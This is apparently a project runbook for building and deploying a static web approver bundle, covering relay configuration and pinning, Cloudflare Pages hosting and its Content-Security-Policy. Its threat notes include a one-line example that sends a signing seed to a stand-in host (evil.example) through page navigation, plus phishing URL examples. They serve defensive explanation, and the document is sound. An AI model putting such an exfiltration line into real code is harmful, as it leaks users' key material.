# Web Approver Deployment Runbook

This runbook covers building and hosting `packages/web-approver`'s production static bundle
(issue #180). Every step a human must run is labelled **[OPERATOR]**. It is a peer of
[`docs/relay-deploy.md`](./relay-deploy.md) — deploy the relay first; the web approver needs a
reachable relay URL to connect to.

> **Thin-shell reminder.** The bundle is a plain static site: HTML/CSS/JS plus the vendored
> `allw-wasm` core. All cryptographic work (decrypt, verify, sign) happens inside that WASM core in
> the browser — the bundle contains no server-side runtime and the host it's deployed to never sees
> plaintext action context or key material (`docs/architecture.md`, `docs/contract.md`).

---

## 1. Build the bundle

**[OPERATOR]** From the repo root:

```sh
pnpm install
pnpm run build:wasm                        # vendors the allw-wasm core (crates/allw-wasm)
pnpm --filter @allw/web-approver build      # tsc, then scripts/build-site.mjs
```

This produces `packages/web-approver/dist-site/`:

```
dist-site/
  index.html                    # copied from public/index.html (no inline script — see §3.1)
  theme.js                      # copied from public/theme.js (light/dark theme bootstrap)
  tokens.css                    # copied from public/tokens.css (vendored design/web-approver/inbox/tokens.css)
  styles.css                    # copied from public/styles.css
  _headers                      # rendered from public/_headers: CSP + security headers (§3.1)
  app.js (+ app.js.map)         # esbuild bundle of src/app.ts
  vendor/allw-wasm/allw_wasm.js
  vendor/allw-wasm/allw_wasm_bg.wasm
```

`dist-site/` is a **flat directory of static files with no server-side dependency and no
Cloudflare-specific runtime API** (`_headers` is a host configuration file, not runtime code — §3.1) — it is hostable on Cloudflare Pages, Netlify, GitHub Pages,
S3+CloudFront, or a plain `npx serve dist-site` for local testing. Cloudflare Pages is the natural
choice alongside the Workers-based relay, but nothing in the bundle requires it.

**Tooling choice — esbuild, not Vite.** The repo's existing tooling taste is plain `tsc` plus small
single-purpose scripts (e.g. `scripts/postbuild-wasm.mjs`); esbuild's JS API is a single function
call from `scripts/build-site.mjs` with no dev-server or plugin ecosystem to introduce, and
esbuild's postinstall lifecycle script is already allow-listed at the workspace root
(`pnpm.onlyBuiltDependencies` in the root `package.json`). Vite would work too, but would add a
config file and a dependency category (a dev-server framework) the workspace doesn't otherwise
need for a single static bundle.

**CI.** `.github/workflows/ci.yml`'s `wasm` job re-runs `pnpm --filter @allw/web-approver build`
immediately after `pnpm run build:wasm` (the `typescript` job's `pnpm -r build` runs before wasm
exists, so the site-bundle step there is a no-op skip — see `scripts/build-site.mjs`'s module doc).
`pnpm -r test` in that same job then exercises `dist-site/` end-to-end: `test/site-build.test.mjs`
serves it over a real `http` server and fetches + instantiates the `.wasm` asset exactly the way a
browser would (`WebAssembly.instantiateStreaming`/`instantiate` against a `fetch()`ed `Response`),
not a Node `fs.readFileSync` shortcut.

---

## 2. Runtime relay configuration (never baked into the bundle)

The same static bundle is deployed once and can be pointed at any relay — self-hosted, staging, or
the hosted `allw-relay` Worker — **without a rebuild**. `src/app.ts` resolves the relay URL, in
priority order (`src/relay-config.ts`):

1. a `?relay=` query-string parameter, e.g.
   `https://approvals.example.com/?relay=https://relay.example.com` — validated (see _HTTPS only_
   below) and persisted to `localStorage` under `allw:relay-url:v1` so a subsequent visit (or a
   home-screen bookmark without the query string) keeps working;
2. a previously-persisted `localStorage` value;
3. neither present → a minimal one-field config prompt is rendered before the pairing gate, so
   first-time visitors without a `?relay=` link can still type in a relay URL by hand.

That order applies **only before pairing**. Once a browser is paired, its relay is pinned (below).

**HTTPS only.** A relay URL is accepted only if it is `https:`, or `http:` on a loopback host
(`localhost`, `127.0.0.1`, `[::1]`) for local development against `wrangler dev`, and it carries no
username, password, query (`?`) or fragment (`#`) — userinfo lets a link look like one host while
pointing at another (`https://relay.example.com@evil.example` is `evil.example`). Anything else —
including `http://relay.example.com` — is rejected at configuration time and the config prompt
shows why, so bearer tokens and ciphertext never travel unencrypted. A path is allowed. The
accepted URL is stored in canonical form: the origin (lowercased, punycode host, default port
dropped) plus the path without trailing slashes. The SDK's `createClient` enforces the same rule;
`packages/sdk/test/fixtures/relay-url-vectors.json` holds the shared accept/reject vectors (issue
#249).

### Relay pinning

Pairing **pins** the relay: the relay URL is stored inside the paired identity (`allw:pairing:v1`,
field `relayUrl`) and every relay call the browser makes afterwards — inbox polling, the `connect`
WebSocket, account-state resolution — goes to that pinned relay.

- **Before pairing**, the pairing screen shows the origin of the relay the browser is about to pin
  (in punycode, so a lookalike internationalized host can't pass as a familiar one), so a relay
  pre-filled by a `?relay=` link is visible before the human commits. Nothing is sent to it until
  pairing completes.
- **After pairing**, a `?relay=` link that differs from the pinned relay is **ignored**: it is not
  persisted and nothing is sent to it, and a notice at the top of the page names the ignored origin.
  This closes the phishing path where `…/?relay=https://evil.example` would re-point a paired device
  and hand its `deviceAuthToken` to the attacker's relay.
- **To change relays**, pair the browser again. "Use another device" on the returning-device screen
  re-pairs against the currently pinned relay; to pin a different relay, clear the site's data for
  the approver origin and open it with the new `?relay=` link.
- **Browsers paired before pinning existed** are bound once, on their next visit, to the relay URL
  they had already persisted (`allw:relay-url:v1`) — never to a `?relay=` link on that visit. If
  none is persisted, the config prompt asks for it.

**[OPERATOR]** To hand a user a working link, share the deployed bundle's URL with `?relay=`
appended, e.g.:

```
https://approvals.example.com/?relay=https://allw-relay.mnorth.workers.dev
```

---

## 3. Deploy to Cloudflare Pages

**[OPERATOR]**

```sh
cd packages/web-approver
npx wrangler@latest pages deploy dist-site --project-name allw-web-approver
```

The first run prompts for Cloudflare authentication (or reuses `wrangler login` from
`docs/relay-deploy.md` §1 if you've already authenticated for the relay) and creates the
`allw-web-approver` Pages project if it doesn't exist. Wrangler prints the deployed URL, e.g.
`https://allw-web-approver.pages.dev`.

No environment variables, secrets, or build configuration are required on the Pages side — the
bundle is fully static and reads its relay URL at runtime (§2 above). Pages applies the
`dist-site/_headers` file automatically (§3.1).

### 3.1 Response headers and the Content-Security-Policy

`public/_headers` is a
[Cloudflare Pages headers file](https://developers.cloudflare.com/pages/configuration/headers/).
`scripts/build-site.mjs` renders it into `dist-site/_headers`, which sets for every path:

| Header                    | Value                                                                                                                                                                          |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `Content-Security-Policy` | `default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; connect-src 'self' <relay origins>; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'` |
| `X-Content-Type-Options`  | `nosniff`                                                                                                                                                                      |
| `Referrer-Policy`         | `no-referrer`                                                                                                                                                                  |
| `X-Frame-Options`         | `DENY` (legacy companion to `frame-ancestors 'none'`)                                                                                                                          |

Why each part matters: the page holds the device's signing seed in browser storage, so any script
running on the approver origin could forge approvals. `script-src 'self'` with no `'unsafe-inline'`
means only the shipped files run (the theme bootstrap is the external `theme.js`, not an inline
script); `'wasm-unsafe-eval'` allows compiling the vendored allw WASM core and nothing else;
`connect-src` limits fetch, XHR and WebSocket traffic to the page itself and the listed relays,
which blocks exfiltration over those channels; `frame-ancestors 'none'` stops the approver being
framed to clickjack an Approve button.

**What the CSP does not do.** It stops injected inline or third-party script from _running_, and it
blocks fetch/XHR/WebSocket exfiltration. It does **not** stop script that is already running on the
approver origin — for example a compromised dependency bundled into `app.js`, which `'self'` allows —
from leaking data by top-level navigation (`location = "https://evil.example/#" + seed`),
`window.open`, or WebRTC. That residual risk is tracked in `docs/threat-model.md` alongside
hardware-backed key custody (#244).

**[OPERATOR] The relay list is set at build time.** `connect-src` must name every relay the deployed
site will talk to — a relay missing from it is blocked by the browser, even if it is pinned. The
build reads the list from `ALLW_RELAY_ORIGINS` (origins separated by spaces or commas) and emits
each origin in both its `https:` and `wss:` forms. Unset, it defaults to the hosted relay
`https://allw-relay.mnorth.workers.dev`. Self-hosters set their own:

```sh
ALLW_RELAY_ORIGINS="https://relay.example.com" pnpm --filter @allw/web-approver build
# local development against wrangler dev:
ALLW_RELAY_ORIGINS="http://127.0.0.1:8787" pnpm --filter @allw/web-approver build
```

The build fails, rather than emitting a weaker policy, if an origin is not `https:` (or `http:` on
`localhost`/`127.0.0.1`), its host is not a plain DNS name or IPv4 address (so wildcards such as
`https://*.workers.dev` and CSP syntax such as `;` never reach the header), it uses an IPv6 address
(a CSP host-source cannot express one — use `http://127.0.0.1:8787` for a local relay), it carries a
path, query, fragment or credentials, or a header line would exceed Cloudflare's 2,000 character
limit.

**[OPERATOR] Verify after every deploy:**

```sh
curl -sI https://allw-web-approver.pages.dev/ | grep -iE 'content-security-policy|x-content-type-options|referrer-policy'
```

> **Live deployment.** The hosted web approver is live at
> [https://allw-web-approver.pages.dev](https://allw-web-approver.pages.dev). Point it at the hosted
> relay from any browser (including a phone) with
> `https://allw-web-approver.pages.dev/?relay=https://allw-relay.mnorth.workers.dev` — no install
> required. Redeploys follow the command above; the project name is `allw-web-approver`.

### Alternative: any static host

Since `dist-site/` has no Cloudflare-specific runtime dependency, any static host works instead.
Netlify reads the same `_headers` format; on any other host, configure the §3.1 headers in the
host or CDN yourself — without them the site still works but loses its CSP protections:

```sh
# Netlify
npx netlify-cli deploy --dir=packages/web-approver/dist-site --prod

# A plain S3 bucket (with static-site hosting enabled) + your CDN of choice
aws s3 sync packages/web-approver/dist-site s3://your-bucket/ --delete

# Local smoke test before deploying anywhere
npx serve packages/web-approver/dist-site
```

---

## 4. Smoke check (mobile browser, against a deployed relay)

**[OPERATOR]** This is the step that confirms issue #180's original problem — opening the approver
from a phone — is actually solved. It cannot be automated in CI (it requires a physical device on
a real network and a live relay), so it is a manual post-deploy check:

1. Deploy the relay (`docs/relay-deploy.md`) and note its URL.
2. Deploy the web approver bundle (§3 above) and note its URL.
3. Pair a device against the relay (e.g. `npx allw-approver pair --relay <RELAY_URL> --account
<ACCOUNT_ID> --label web-phone`), noting the printed `device_id`, `device_auth_token`, seeds,
   and device cert — the pairing form on the phone (§5 below) collects these same 7 fields.
4. On a phone, open `<WEB_APPROVER_URL>/?relay=<RELAY_URL>` in the browser.
5. Complete the pairing form with the values from step 3 (this is the same dev-mode
   credential-stub path `packages/approver` uses locally; a QR/deep-link flow that pre-fills these
   fields is tracked separately, see `design/web-approver/onboarding/`).
6. Trigger a request against the paired account (e.g. via the Claude Code hook or
   `allw-approver watch` on another device) and confirm it appears in the phone's inbox, the
   WYSIWYS plaintext renders correctly, and Approve/Deny signs and clears it.

---

## 5. Pairing-identity note

The pairing form (`src/pairing.ts`) collects all 7 fields `ApproverIdentity` requires: `accountId`,
`deviceId`, `deviceEncryptionSeed`, `deviceSigningSeed`, `deviceCert`, `accountRootPubkey`, and
`deviceAuthToken` (the relay bearer token from `docs/relay-api.md` §Pairing — distinct from
`deviceCert`, which chains verdict signatures to the account root rather than authorizing relay
HTTP calls). The stored identity also records the pinned `relayUrl` (§2, _Relay pinning_); that
comes from the relay configuration shown on the pairing screen, not from a form field. A friendlier pairing UX (QR code / deep link that pre-fills these fields instead of
manual entry) is tracked separately and out of scope for this bundling/deploy issue.

---

## Appendix: what this runbook has and has not verified

| Item                                                                          | Status                                                               |
| ----------------------------------------------------------------------------- | -------------------------------------------------------------------- |
| `pnpm --filter @allw/web-approver build` produces a working `dist-site/`      | Verified                                                             |
| `dist-site/` builds without wasm (skips cleanly, `pnpm -r build` still green) | Verified                                                             |
| `.wasm` served with correct content-type and instantiates over real HTTP      | Verified (`test/site-build.test.mjs`)                                |
| Relay URL resolved at runtime (query param / storage / config prompt)         | Verified (`test/relay-config.test.mjs`)                              |
| No literal relay URL embedded in the bundled `app.js`                         | Verified (`test/site-build.test.mjs`)                                |
| `_headers` ships with the CSP directives; `index.html` has no inline script   | Verified (`test/site-build.test.mjs`)                                |
| Relay pinned at pairing; a differing `?relay=` is ignored with a notice       | Verified (`test/app-boot.test.mjs`)                                  |
| HTTPS-only relay URLs (http only on loopback)                                 | Verified (`test/relay-config.test.mjs`, SDK `relay-url-transport`)   |
| CSP does not break WASM load or relay fetch/WebSocket in a real browser       | Verified locally in Chrome against `wrangler dev` (issue #249 PR)    |
| CSP header present on the live Pages deployment (`curl -sI`)                  | **Not run** — post-deploy operator step (§3.1)                       |
| Actual deploy to Cloudflare Pages (or any host)                               | **Not run** — human operator step (§3)                               |
| Mobile-browser smoke test against a live deployed relay                       | **Not run** — human operator step (§4); requires a real device/relay |
